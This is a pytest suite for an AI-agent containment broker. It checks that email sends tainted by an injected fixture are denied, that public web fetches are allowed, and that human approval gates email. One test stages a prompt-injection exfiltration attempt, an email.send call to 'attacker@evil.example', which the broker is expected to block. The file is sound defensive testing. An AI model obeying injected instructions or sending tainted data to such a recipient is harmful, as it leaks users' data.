"""Hermetic reference host: attack deny, benign allow, human approval, CLI."""

from __future__ import annotations

from pathlib import Path

import pytest

from containment.broker import SecurityViolation
from containment.reference_host import (
    APPROVED_RECIPIENT,
    STEP_EMAIL,
    STEP_FETCH,
    build_reference_host,
    load_fixture,
    run_all,
    run_attack,
    run_benign,
    run_human,
)
from containment.reference_host.cli import main as ref_host_main


def test_attack_denies_tainted_email(tmp_path: Path) -> None:
    result = run_attack(tmp_path / "attack")
    assert result.ok is True
    assert result.path == "attack"
    assert result.effect == "deny"
    assert result.rule_id == "no-tainted-egress"


def test_benign_allows_web_fetch(tmp_path: Path) -> None:
    result = run_benign(tmp_path / "benign")
    assert result.ok is True
    assert result.effect == "allow"
    assert result.rule_id == "read-public-web"


def test_human_requires_approval_then_allows(tmp_path: Path) -> None:
    result = run_human(tmp_path / "human")
    assert result.ok is True
    assert result.effect == "require_human"
    assert result.rule_id == "approved-email"
    assert result.extra is not None
    assert APPROVED_RECIPIENT in str(result.extra.get("result"))


def test_run_all_three_pass(tmp_path: Path) -> None:
    results = run_all(tmp_path / "all")
    assert len(results) == 3
    assert all(r.ok for r in results)
    assert {r.path for r in results} == {"attack", "benign", "human"}


def test_cli_all_exit_zero(tmp_path: Path) -> None:
    rc = ref_host_main(["--work-dir", str(tmp_path / "cli"), "--scenario", "all"])
    assert rc == 0


def test_cli_attack_exit_zero(tmp_path: Path) -> None:
    rc = ref_host_main(["--work-dir", str(tmp_path / "cli-a"), "--scenario", "attack"])
    assert rc == 0


def test_live_moltbook_refused_without_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("CONTAINMENT_LIVE_MOLTBOOK", raising=False)
    rc = ref_host_main(
        [
            "--work-dir",
            str(tmp_path / "cli-live"),
            "--scenario",
            "attack",
            "--live-moltbook",
        ]
    )
    assert rc == 2


def test_direct_host_attack_never_sends(tmp_path: Path) -> None:
    host = build_reference_host(tmp_path / "direct")
    text = load_fixture("attack_inject.txt")
    from containment.ingest import ingest

    ingested = ingest(text, source="test", task_id=host.plan.task_id)
    with pytest.raises(SecurityViolation) as ei:
        host.call(
            "email.send",
            {"recipient": "attacker@evil.example", "body": "x"},
            input_labels=(ingested.label,),
            plan_step=STEP_EMAIL,
        )
    assert ei.value.decision.rule_id == "no-tainted-egress"
    assert host.send_log == []


def test_direct_benign_fetch_records(tmp_path: Path) -> None:
    host = build_reference_host(tmp_path / "fetch")
    out = host.call(
        "web.fetch",
        {"url": "https://example.com/"},
        input_labels=(host.trusted_label(),),
        plan_step=STEP_FETCH,
    )
    assert "hermetic-fetch" in out
    assert host.fetch_log == [{"url": "https://example.com/"}]
    assert any(d.get("rule_id") == "read-public-web" for d in host.audit_decisions())


def test_no_live_network_in_default_suite(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Guards: default scenarios must not call urllib / moltbook."""
    calls: list[str] = []

    def _blocked(*_a, **_k):  # noqa: ANN001
        calls.append("network")
        raise AssertionError("network I/O forbidden in hermetic reference-host tests")

    monkeypatch.setattr("urllib.request.urlopen", _blocked)
    monkeypatch.delenv("CONTAINMENT_LIVE_MOLTBOOK", raising=False)
    results = run_all(tmp_path / "offline")
    assert all(r.ok for r in results)
    assert calls == []
